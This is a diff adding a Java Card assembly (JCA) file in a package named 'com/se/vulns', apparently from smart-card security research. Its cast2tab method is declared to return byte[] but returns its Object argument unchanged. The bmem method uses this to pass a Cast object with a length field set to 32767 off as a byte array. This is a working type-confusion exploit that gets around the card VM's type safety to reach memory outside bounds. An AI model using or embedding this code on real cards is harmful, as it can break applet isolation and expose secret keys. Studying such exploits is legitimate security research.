@@ -1,0 +1,105 @@
+// converted by version  [v3.1.0]
+// on Sat Apr 11 15:44:28 CEST 2020
+
+.package com/se/vulns {
+	.aid 0xA0:0x0:0x0:0x0:0x62:0x3:0x1:0xC:0x2;
+	.version 0.0;
+
+	.imports {
+		0xA0:0x0:0x0:0x0:0x62:0x0:0x1 1.0;		//java/lang
+	}
+
+	.constantPool {
+		// 0
+		instanceFieldRef short Cast/len;
+		// 1
+		staticMethodRef 0.0.0()V;		// java/lang/Object.<init>()V
+		// 2
+		staticFieldRef byte[] Cast/bmem;
+		// 3
+		staticFieldRef int[] Cast/imem;
+		// 4
+		.classRef Cast;
+		// 5
+		staticMethodRef Cast/<init>()V;
+		// 6
+		staticFieldRef Cast Cast/c;
+		// 7
+		staticMethodRef Cast/cast2tab([BLjava/lang/Object;)[B;
+			.descriptor	Ljava/lang/Object;	0.0;
+
+	}
+
+	.class public Cast 0 extends 0.0 {		// extends java/lang/Object
+
+		.fields {
+			 short len 0;		// S
+			 short dummy 1;		// S
+			public static final byte BMEM_SIZE = 2;		// B
+			public static final byte IMEM_SIZE = 2;		// B
+			static Cast c;		// Lcom/se/vulns/Cast;
+			static byte[] bmem;		// [B
+			static int[] imem;		// [I
+		}
+
+		.publicMethodTable 1 1 {
+			equals(Ljava/lang/Object;)Z 0;
+		}
+
+		.packageMethodTable 0 {
+		}
+
+		.method public <init>()V 0 {
+			.stack 2;
+			.locals 0;
+
+				L0:	aload_0;
+					invokespecial 1;		// java/lang/Object.<init>()V
+					sspush 32767;
+					putfield_s_this 0;		// short com/se/vulns/Cast.len
+					return;
+		}
+
+		.method public static cast2tab([BLjava/lang/Object;)[B 1 {
+			.stack 1;
+			.locals 0;
+
+			.descriptor	Ljava/lang/Object;	0.0;
+
+				L0:	aload_0;
+					areturn;
+		}
+
+		.method public static bmem()[B 2 {
+			.stack 4;
+			.locals 0;
+
+				L0:	getstatic_a 2;		// reference com/se/vulns/Cast.bmem
+					ifnonnull L2;
+				L1:	sconst_2;
+					newarray 13;
+					putstatic_a 3;		// reference com/se/vulns/Cast.imem
+					getstatic_a 3;		// reference com/se/vulns/Cast.imem
+					sconst_0;
+					iipush 287454020;
+					iastore;
+					getstatic_a 3;		// reference com/se/vulns/Cast.imem
+					sconst_1;
+					iipush 1432778632;
+					iastore;
+					new 4;		// com/se/vulns/Cast
+					dup;
+					invokespecial 5;		// com/se/vulns/Cast.<init>()V
+					putstatic_a 6;		// reference com/se/vulns/Cast.c
+					sconst_2;
+					newarray 11;
+					putstatic_a 2;		// reference com/se/vulns/Cast.bmem
+				L2:	getstatic_a 2;		// reference com/se/vulns/Cast.bmem
+					getstatic_a 6;		// reference com/se/vulns/Cast.c
+					invokestatic 7;		// com/se/vulns/Cast.cast2tab([BLjava/lang/Object;)[B
+					areturn;
+		}
+
+	}
+
+}
